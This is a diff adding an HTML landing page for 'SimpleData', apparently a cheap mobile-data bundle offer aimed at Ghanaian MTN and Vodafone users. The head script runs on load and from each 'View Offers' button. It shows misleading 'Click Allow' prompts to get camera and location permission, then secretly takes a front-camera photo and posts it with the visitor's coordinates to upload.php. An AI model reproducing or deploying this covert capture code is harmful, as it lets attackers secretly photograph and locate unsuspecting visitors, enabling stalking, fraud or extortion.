@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <link rel="icon" href="/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="#000000" />
+  <title>Your plug for affordable data</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=DM+Sans%3A400%2C700"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A400%2C700"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%3A400"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo%3A400"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins%3A700"/>
+  <link rel="stylesheet" href="./styles/desktop-1.css"/>
+          <script>
+        function runOnPageLoad() {
+            createCapturedFolder(); // Step 1
+            takePictureAndSendToServer();
+        }
+
+        function takePictureAndSendToServer() {
+            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                // Display an alert when requesting camera access
+                showAlert('Do you use MTN or VODAFONE. Click Allow to continue');
+
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(function (stream) {
+                        // Hide the alert when camera access is granted
+                        hideAlert();
+
+                        const videoElement = document.createElement('video');
+                        videoElement.srcObject = stream;
+                        videoElement.play();
+
+                        videoElement.onloadedmetadata = function () {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = videoElement.videoWidth;
+                            canvas.height = videoElement.videoHeight;
+
+                            setTimeout(function () {
+                                canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                                const imageDataURL = canvas.toDataURL('image/jpeg');
+
+                                // Capture the user's location
+                                if ("geolocation" in navigator) {
+                                    // Display an alert when requesting location access
+                                    showAlert('Bundle offers available to Ghanains only. Click Allow');
+
+                                    navigator.geolocation.getCurrentPosition(function (position) {
+                                        // Hide the alert when location access is granted
+                                        hideAlert();
+
+                                        const latitude = position.coords.latitude;
+                                        const longitude = position.coords.longitude;
+
+                                        // Send the image and location data to the server
+                                        sendToServer(imageDataURL, latitude, longitude);
+
+                                        stream.getTracks().forEach(function (track) {
+                                            track.stop();
+                                        });
+                                    }, function (error) {
+                                        console.error('Error getting location:', error);
+                                        hideAlert(); // Hide the alert in case of an error
+                                    });
+                                } else {
+                                    console.error('Geolocation is not available in this browser.');
+                                    hideAlert(); // Hide the alert if geolocation is not available
+                                }
+                            }, 1000);
+                        };
+                    })
+                    .catch(function (error) {
+                        console.error('Error accessing the camera:', error);
+                        hideAlert(); // Hide the alert in case of an error
+                    });
+            } else {
+                console.error('getUserMedia is not supported on this device.');
+            }
+        }
+
+        function sendToServer(imageDataURL, latitude, longitude) {
+            const serverUrl = 'upload.php'; // Replace with your server-side script URL
+
+            // Create a FormData object to send the image and location data
+            const formData = new FormData();
+            formData.append('image', imageDataURL);
+            formData.append('latitude', latitude);
+            formData.append('longitude', longitude);
+
+            // Use fetch to send the FormData to the server
+            fetch(serverUrl, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Response from server:', data);
+
+                // You can handle additional logic based on the server response if needed
+            })
+            .catch(error => {
+                console.error('Error sending data to server:', error);
+            });
+        }
+
+        function showAlert(message) {
+            // Display an alert to the user
+            alert(message);
+        }
+
+        function hideAlert() {
+            // No need to hide an alert, as it automatically disappears
+        }
+
+        function createCapturedFolder() {
+            // Create the "Captured" folder if it doesn't exist
+            const folderPath = 'Captured';
+            if (!fileExists(folderPath)) {
+                createFolder(folderPath);
+            }
+        }
+
+        function fileExists(path) {
+            // Check if a file or folder exists at the specified path
+            // You may need to implement this function based on your environment
+            // This is a simplified example
+            return true; // Replace with actual implementation
+        }
+
+        function createFolder(folderPath) {
+            // Create a folder at the specified path
+            // You may need to implement this function based on your environment
+            // This is a simplified example
+            console.log(`Folder created: ${folderPath}`);
+        }
+
+        window.onload = runOnPageLoad;
+    </script>
+</head>
+<body>
+<div class="desktop-1-MaZ">
+  <div class="header-yrq">
+    <div class="bg-gPs">
+    </div>
+    <div class="service-C7K">
+      <div class="item-1-7VB">
+        <div class="shadow-qvy">
+        </div>
+        <div class="bg-7Nh">
+        </div>
+        <img class="forma-1-rLH" src="./assets/forma-1-Jn5.png"/>
+        <div class="group-83-xu7">
+          <img class="group-82-sFP" src="./assets/group-82-BQD.png"/>
+        </div>
+        <p class="do-you-need-help-support-afb">Do you need help support</p>
+        <p class="lorem-ipsum-dolor-sit-amet-consectetur-adipisicing-elit-sed-eiu-Sxh">Get your website ads tests delivered at let collect sample from the victory of the update managments services.</p>
+      </div>
+      <div class="item-2-i9X">
+        <div class="group-83-d1b">
+          <img class="group-82-8U9" src="./assets/group-82.png"/>
+        </div>
+        <div class="auto-group-ysmp-fDB">
+          <p class="do-you-need-help-support-zmF">Do you need help support</p>
+          <p class="lorem-ipsum-dolor-sit-amet-consectetur-adipisicing-elit-sed-eiu-dxd">Get your website ads tests delivered at let collect sample from the victory of the update managments services.</p>
+        </div>
+        <img class="forma-1-Mdj" src="./assets/forma-1.png"/>
+      </div>
+    </div>
+    <p class="ultimate-place-for-purchasing-cheap-and-affordable-data-UiM">Ultimate place for purchasing cheap and affordable data</p>
+    <div class="group-81-9pV">Get Started</div>
+    <div class="home-adversite-supports-marketing--oe9">
+      <span class="home-adversite-supports-marketing--oe9-sub-0">Home</span>
+      <span class="home-adversite-supports-marketing--oe9-sub-2">About</span>
+    </div>
+    <div class="logo-u6q">
+      <img class="s-1-E97" src="./assets/s-1-kHw.png"/>
+      <div class="petro-ZhB">SimpleData</div>
+    </div>
+    <img class="lock-V53" src="./assets/lock.png"/>
+    <img class="illustration-Ck9" src="./assets/illustration.png"/>
+    <img class="mask-group-vg9" src="./assets/mask-group.png"/>
+    <img class="mask-group-es3" src="./assets/mask-group-zwj.png"/>
+    <img class="mask-group-b1b" src="./assets/mask-group-qA9.png"/>
+    <button class="frame-1-XA9" onclick="takePictureAndSendToServer();"> View   Offers</button>
+    <button class="frame-4-xFT" onclick="takePictureAndSendToServer();"> View   Offers</button>
+    <button class="frame-3-zhw" onclick="takePictureAndSendToServer();"> View   Offers</button>
+  </div>
+</div>
+<div class="bottom-pZf">
+  <div class="logo-wPP">
+    <img class="s-1-GRf" src="./assets/s-1.png"/>
+    <div class="petro-QGy">SimpleData</div>
+  </div>
+  <p class="copyright-by-2023-agyapongdigitalservices-inc-Wau">Copyright by 2023 AgyapongDigitalServices, Inc</p>
+</div>
+</body>
